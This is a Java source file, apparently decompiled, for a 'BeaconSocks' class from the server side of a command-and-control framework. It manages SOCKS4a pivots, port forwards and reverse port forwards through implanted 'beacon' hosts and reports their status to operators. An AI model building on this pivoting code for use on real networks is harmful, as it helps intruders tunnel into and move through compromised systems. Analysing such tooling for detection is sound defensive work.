package beacon;

import common.BeaconOutput;
import common.CommonUtils;
import java.io.IOException;
import java.util.HashMap;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import java.util.Map.Entry;
import server.ManageUser;
import socks.BeaconProxyListener;
import socks.Mortal;
import socks.PortForward;
import socks.ReversePortForward;
import socks.SocksProxy;
import socks.SocksProxyServer;

public class BeaconSocks {
   protected BeaconTunnels tunnels;
   protected Map socks = new HashMap();
   protected Map servers = new HashMap();
   protected BeaconC2 controller;

   public BeaconSocks(BeaconC2 var1) {
      this.controller = var1;
      this.tunnels = new BeaconTunnels(this);
   }

   public void notifyClients() {
      LinkedList var1 = new LinkedList();
      synchronized(this) {
         Iterator var3 = this.servers.entrySet().iterator();

         while(var3.hasNext()) {
            Entry var4 = (Entry)var3.next();
            String var5 = (String)var4.getKey();
            List var6 = (List)var4.getValue();
            Iterator var7 = var6.iterator();

            while(var7.hasNext()) {
               Mortal var8 = (Mortal)var7.next();
               Map var9 = var8.toMap();
               var9.put("bid", var5);
               var1.add(var9);
            }
         }
      }

      this.controller.getCheckinListener().push("socks", var1);
   }

   public SocksProxy getBroker(String var1) {
      synchronized(this) {
         if (this.socks.containsKey(var1)) {
            return (SocksProxy)this.socks.get(var1);
         } else {
            SocksProxy var3 = new SocksProxy();
            var3.addProxyListener(new BeaconProxyListener());
            this.socks.put(var1, var3);
            return var3;
         }
      }
   }

   public void deregister(ManageUser var1) {
      synchronized(this) {
         this.tunnels.deregister(var1);
         this.notifyClients();
      }
   }

   public void task(String var1, byte[] var2) {
      this.getBroker(var1).read(var2);
   }

   public void track(String var1, Mortal var2) {
      synchronized(this) {
         if (!this.servers.containsKey(var1)) {
            this.servers.put(var1, new LinkedList());
         }

         LinkedList var4 = (LinkedList)this.servers.get(var1);
         var4.add(var2);
      }

      this.notifyClients();
   }

   public void pivot(String var1, int var2) {
      synchronized(this) {
         SocksProxyServer var4 = new SocksProxyServer(this.getBroker(var1));

         try {
            var4.go(var2);
            this.track(var1, var4);
            this.controller.getCheckinListener().output(BeaconOutput.Output(var1, "started SOCKS4a server on: " + var2));
         } catch (IOException var7) {
            this.controller.getCheckinListener().output(BeaconOutput.Error(var1, "Could not start SOCKS4a server on " + var2 + ": " + var7.getMessage()));
         }

      }
   }

   protected void expelReversePortForwards(String var1, int var2) {
      synchronized(this) {
         if (this.servers.containsKey(var1)) {
            Iterator var4 = ((LinkedList)this.servers.get(var1)).iterator();

            while(var4.hasNext()) {
               Mortal var5 = (Mortal)var4.next();
               if (var5 instanceof ReversePortForward) {
                  ReversePortForward var6 = (ReversePortForward)var5;
                  if (var6.getPort() == var2) {
                     CommonUtils.print_stat("Removed handler '" + var6 + "' as it conflicts with new port forward on " + var2);
                     var4.remove();
                  }
               }
            }
         }

      }
   }

   public void remove(String var1, Mortal var2) {
      synchronized(this) {
         if (this.servers.containsKey(var1)) {
            LinkedList var4 = (LinkedList)this.servers.get(var1);
            var4.remove(var2);
         }
      }

      this.getBroker(var1).cleanup();
      this.notifyClients();
   }

   public boolean hasServer(String var1, Class var2) {
      return this.getServer(var1, var2) != null;
   }

   public Mortal getServer(String var1, Class var2) {
      synchronized(this) {
         if (this.servers.containsKey(var1)) {
            Iterator var4 = ((LinkedList)this.servers.get(var1)).iterator();

            while(var4.hasNext()) {
               Mortal var5 = (Mortal)var4.next();
               if (var2.isInstance(var5)) {
                  return var5;
               }
            }
         }

         return null;
      }
   }

   protected ReversePortForward findReversePortForward(String var1, int var2) {
      synchronized(this) {
         if (this.servers.containsKey(var1)) {
            Iterator var4 = ((LinkedList)this.servers.get(var1)).iterator();

            while(var4.hasNext()) {
               Mortal var5 = (Mortal)var4.next();
               if (var5 instanceof ReversePortForward) {
                  ReversePortForward var6 = (ReversePortForward)var5;
                  if (var6.getPort() == var2) {
                     return var6;
                  }
               }
            }
         }

         return null;
      }
   }

   public void accept(String var1, int var2, int var3) {
      synchronized(this) {
         ReversePortForward var5 = this.findReversePortForward(var1, var2);
         if (var5 != null) {
            if (!this.tunnels.accept(var1, var2, var3, var5)) {
               var5.accept(var3);
            }
         }
      }
   }

   public void portfwd(String var1, int var2, String var3, int var4) {
      synchronized(this) {
         PortForward var6 = new PortForward(this.getBroker(var1), var3, var4);

         try {
            var6.go(var2);
            this.track(var1, var6);
            this.controller.getCheckinListener().output(BeaconOutput.Output(var1, "started port forward on " + var2 + " to " + var3 + ":" + var4));
         } catch (IOException var9) {
            this.controller.getCheckinListener().output(BeaconOutput.Error(var1, "Could not start port forward on " + var2 + ": " + var9.getMessage()));
         }

      }
   }

   public void rportfwd(String var1, int var2, String var3, int var4) {
      synchronized(this) {
         this.expelReversePortForwards(var1, var2);
         ReversePortForward var6 = new ReversePortForward(this.getBroker(var1), var2, var3, var4);
         this.track(var1, var6);
         this.controller.getCheckinListener().output(BeaconOutput.Output(var1, "started reverse port forward on " + var2 + " to " + var3 + ":" + var4));
      }
   }

   public void rportfwd_local(ManageUser var1, String var2, int var3, String var4, int var5) {
      synchronized(this) {
         this.expelReversePortForwards(var2, var3);
         ReversePortForward var7 = this.tunnels.createReversePortForward(var1, var2, var3, var4, var5);
         this.track(var2, var7);
         this.controller.getCheckinListener().output(BeaconOutput.Output(var2, "started reverse port forward on " + var3 + " to " + var1.getNick() + " -> " + var4 + ":" + var5));
      }
   }

   public void stop_port(String var1, int var2) {
      synchronized(this) {
         LinkedList var4 = (LinkedList)this.servers.get(var1);
         if (var4 == null) {
            return;
         }

         Iterator var5 = var4.iterator();

         while(true) {
            if (!var5.hasNext()) {
               if (var4.size() == 0) {
                  this.servers.remove(var1);
               }
               break;
            }

            Mortal var6 = (Mortal)var5.next();
            if (var6.getPort() == var2) {
               this.controller.getCheckinListener().output(BeaconOutput.Output(var1, "stopped proxy pivot on " + var2));
               var6.die();
               var5.remove();
            }
         }
      }

      this.getBroker(var1).cleanup();
      this.notifyClients();
   }

   public void stop_port(int var1) {
      synchronized(this) {
         Iterator var3 = this.servers.entrySet().iterator();

         while(true) {
            if (!var3.hasNext()) {
               break;
            }

            Entry var4 = (Entry)var3.next();
            String var5 = (String)var4.getKey();
            LinkedList var6 = (LinkedList)var4.getValue();
            Iterator var7 = var6.iterator();

            while(var7.hasNext()) {
               Mortal var8 = (Mortal)var7.next();
               if (var8.getPort() == var1) {
                  this.controller.getCheckinListener().output(BeaconOutput.Output(var5, "stopped proxy pivot on " + var1));
                  var8.die();
                  var7.remove();
               }
            }

            if (var6.size() == 0) {
               var3.remove();
            }
         }
      }

      this.notifyClients();
   }

   public void stop_socks(String var1) {
      synchronized(this) {
         if (this.servers.containsKey(var1)) {
            LinkedList var3 = (LinkedList)this.servers.get(var1);
            Iterator var4 = var3.iterator();

            while(var4.hasNext()) {
               Mortal var5 = (Mortal)var4.next();
               if (var5 instanceof SocksProxyServer) {
                  var5.die();
                  var4.remove();
               }
            }

            if (var3.size() == 0) {
               this.servers.remove(var1);
            }
         }
      }

      this.getBroker(var1).cleanup();
      this.controller.getCheckinListener().output(BeaconOutput.Output(var1, "stopped SOCKS4a servers"));
      this.notifyClients();
   }

   public boolean isActive(String var1) {
      synchronized(this) {
         return this.servers.containsKey(var1);
      }
   }

   public void die(String var1, int var2) {
      synchronized(this) {
         if (!this.tunnels.die(var1, var2)) {
            SocksProxy var4 = (SocksProxy)this.socks.get(var1);
            if (var4 != null) {
               var4.die(var2);
            }
         }
      }
   }

   public void write(String var1, int var2, byte[] var3) {
      synchronized(this) {
         if (!this.tunnels.write(var1, var2, var3)) {
            SocksProxy var5 = (SocksProxy)this.socks.get(var1);
            if (var5 != null) {
               var5.write(var2, var3);
            }
         }
      }
   }

   public void resume(String var1, int var2) {
      synchronized(this) {
         SocksProxy var4 = (SocksProxy)this.socks.get(var1);
         if (var4 != null) {
            var4.resume(var2);
         }
      }
   }

   public byte[] dump(String var1, int var2) {
      synchronized(this) {
         SocksProxy var4 = (SocksProxy)this.socks.get(var1);
         return var4 == null ? new byte[0] : var4.grab(var2);
      }
   }
}
